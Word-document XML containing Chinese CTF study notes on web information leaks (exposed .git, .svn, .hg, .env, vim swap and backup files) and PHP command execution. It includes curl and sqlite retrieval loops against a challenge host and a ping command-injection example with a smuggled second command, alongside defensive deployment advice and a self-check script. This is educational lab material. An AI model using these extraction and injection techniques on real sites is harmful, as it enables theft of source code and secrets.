        <w:t>pristine/&lt;sha1前2位&gt;/&lt;sha1&gt;.svn-base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1.7+ 打法（实测）：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-o wc.db "$T/.svn/wc.db"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sqlite3 wc.db "SELECT checksum, size, refcount FROM PRISTINE;"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  $sha1$bf45c36a... | 221 | 1     ← 还在用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  $sha1$0b4474e3... |  33 | 0     ← ★ 被删掉的旧版本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C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>refcount = 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 没有任何工作副本文件引用它 = 被删掉的旧版本残留。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⚠️ 只看 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>NODES</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会漏：被删的文件 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>presence='not-present'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checksum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为空。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四行版：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T="http://challenge-xxx:10800"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-o wc.db "$T/.svn/wc.db"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for h in $(sqlite3 wc.db "SELECT checksum FROM PRISTINE;" | sed 's/\$sha1\$//');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curl -s "$T/.svn/pristine/${h:0:2}/${h}.svn-base"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done | grep -a ctfhub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2.2.4 HG 补充细节（题目 4 的延伸）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成因：在 web 目录 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hg clone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hg pull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三个关键文件：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.hg/last-message.txt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作用：最后一次 commit message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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>add flag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.hg/store/fncache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作用：文件清单缓存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实测：每行一个 store 路径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.hg/dirstate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作用：当前文件列表（二进制）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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 出 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>flag_xxx.txt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⚠️ 两个致命细节：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① 文件名要编码：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_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__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（下划线是转义符）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fncache 里：data/flag_807728508.txt.i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实际路径：  data/flag__807728508.txt.i     ← 双下划线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直接按 fncache 取 → 404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改成双下划线     → 200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② revlog 里的数据带标记字节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75 63 74 66 68 75 62 7b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└┬┘ 'u' = 后面是原文（不是 zlib）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pP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'u'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> (0x75)：原文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'x'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> (0x78)：zlib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0x00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：原文（无标记）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最简打法：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① 拿文件名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"$T/.hg/dirstate" | strings | grep -E '\.txt$'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② 名字里 _ 换成 __，取内容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"$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'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2.2.5 `.env` 直接暴露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成因：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 xml:space="preserve"> 放在 web 根，被 HTTP 直接读取。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内容常含：数据库密码、API Key、JWT Secret、Redis 密码。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注意：有些值是 base64 编码的，要 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>base64 -d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2.3 作业五问（详见 `notes/20-信息泄露作业答案.md`）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1：Git 泄露是什么，为什么会有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是什么：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.git</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录被部署到 web 根，HTTP 能直接读。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为什么：用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>clone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pull</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 部署、在 web 目录直接开发、打包没加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>--exclude=.git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为什么危害大：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git rm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 删不掉对象 —— 要 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>reflog expire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gc --prune</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 才彻底。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2：备份文件有哪些；vim 缓存有哪些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备份文件 6 类（见 2.2.2）。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vim 缓存 3 类 8 种：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swap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文件名：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.文件名.swp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.swo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.swn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.swm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.swl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>...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触发：编辑中崩溃/被 kill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undo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文件名：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.文件名.un~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触发：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>set undofile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backup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文件名：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>文件名~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触发：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>set backup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swap 的三种取法（实测对比）：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grep -ao "flag{[^}]*}" .index.php.swp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：⭐⭐⭐ 完整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strings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：⭐⭐ 顺带能拿到服务器绝对路径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vim -r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：⚠️ 可能只写了一半 → 恢复残缺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i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">认知修正：不是"必须 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>vim -r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"。swap 按块异步写，崩溃时可能只写一半，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 反而更完整。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3：SVN 泄露由什么引起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在 web 目录 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>svn checkout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 xml:space="preserve"> 留在 web 根。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正确做法：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>svn export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4：不同种类怎么获取泄露的信息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统一四步框架：探测 → 拿清单 → 取内容 → 解码。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源码包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探测：字典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拿清单：解压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取内容：文件名当 URL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解码：—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.bak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探测：加后缀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拿清单：—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curl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vim swp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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.文件名.swp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拿清单：—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curl -O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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>grep -a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.DS_Store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探测：固定路径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拿清单：解析 filename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取内容：文件名当 URL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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ds_store</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Git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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.git/HEAD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拿清单：reflog / index / refs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objects/&lt;h[:2]&gt;/&lt;h[2:]&gt;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解码：zlib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SVN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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.svn/wc.db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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>NODES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PRISTINE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pristine/&lt;h[:2]&gt;/&lt;h&gt;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解码：原文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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.hg/requires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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fncache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dirstate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store/data/&lt;编码名&gt;.i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④ 解码：zlib 或 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'u'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>+原文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.env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① 探测：固定路径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② 拿清单：—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③ 取内容：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>curl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④ 解码：base64 -d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三个版本库的差异只有三条：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清单来源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Git：reflog + index + refs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SVN：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wc.db</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（SQLite）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HG：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fncache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dirstate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内容路径由什么决定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Git：内容哈希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SVN：内容哈希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HG：文件名编码 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内容编码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Git：zlib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SVN：原文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HG：zlib 或 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'u'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>+原文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i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>记忆法：Git/SVN 按"内容指纹"找书（哈希），HG 按"书名"找书（文件名编码）。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5：信息泄露出现的最大原因（自思考）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一句话：不是"被攻破了什么"，而是"该藏的东西被当成了公开的东西"。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三层原因：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① 表层：开发环境和部署环境没有分离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开发需要：.git / .svn / .env / .swp / node_modules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部署该有：只有源码文件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用 clone / checkout / 拷整个目录 部署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开发环境的东西【全部】被当成网站内容发布了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② 认知：「看不见 = 不存在」的错觉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.git  .svn  .env  .DS_Store  .index.php.swp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└─────────────┬─────────────┘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都以 . 开头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ls 看不见 → 以为不存在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但 HTTP 请求不看你的 ls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③ 动机：便利优先于安全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git clone</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 部署：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git archive</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 打干净包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svn checkout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 部署：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>svn export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 xml:space="preserve"> 放 web 根：环境变量 / 配置中心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备份放同目录：备份到 web 根之外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结论：信息泄露的根本原因不是技术问题，是流程问题。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防御靠的不是 WAF，是部署前那一条 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rm -rf .git .svn .env *.bak *.swp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五秒自查脚本：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for p in .git/HEAD .svn/entries .svn/wc.db .hg/requires .env .DS_Store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www.zip index.php.bak .index.php.swp;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code=$(curl -s -o /dev/null -w "%{http_code}" "https://your-site/$p")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[ "$code" = "200" ] &amp;&amp; echo "[!] 泄露: /$p"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done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2.4 复现证据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每个漏洞都在本地 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>~/infoleak-lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 Kali 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php -S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 复刻过：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Git 四种变体：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>git init</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> + 手工制造 reflog / stash / index 差异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SVN：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>svnadmin create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svn checkout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> + 删文件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HG：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hg init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hg commit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hg rm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备份文件 / vim：直接造 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.bak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.swp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.DS_Store</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：Python 生成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典型复刻脚本位置：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>D:\VMs\logs\*.sh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gitlog-run.sh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svn-pwn.sh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hg-dig.sh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lfi-trace2.sh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 等）。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第三章 PHP 命令执行与绕过（1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3.1 命令执行的根因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危险写法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4 " . $_GET['ip']);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pP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用户输入: 127.0.0.1;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拼出来的: ping -c 4 127.0.0.1;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↑ 分号 = 命令分隔符 → 第二条被执行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两个层面：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系统命令执行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执行什么：交给 shell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函数：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>system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shell_exec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passthru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popen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proc_open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> / 反引号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代码执行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执行什么：交给 PHP 解释器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函数：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>eval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assert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create_function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preg_replace(/e)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call_user_func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array_map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3.2 八个系统命令执行函数（PHP 8.4 实测）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测试命令：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo line1; echo line2; id -un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system()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直接回显：✅ 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string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（最后一行）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退出码：✅ 第 2 参数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exec()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直接回显：❌ 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string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（最后一行）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多行：需第 2 参数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退出码：✅ 第 3 参数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shell_exec()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直接回显：❌ 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string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（全部输出）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退出码：❌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</w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>反引号</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr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直接回显：❌ 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string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（全部）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退出码：❌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passthru()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直接回显：✅ 有（原始二进制）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null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退出码：✅ 第 2 参数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popen()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直接回显：❌ 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resource</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（文件指针）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多行：✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fread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退出码：✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>pclose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proc_open()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直接回显：❌ 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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
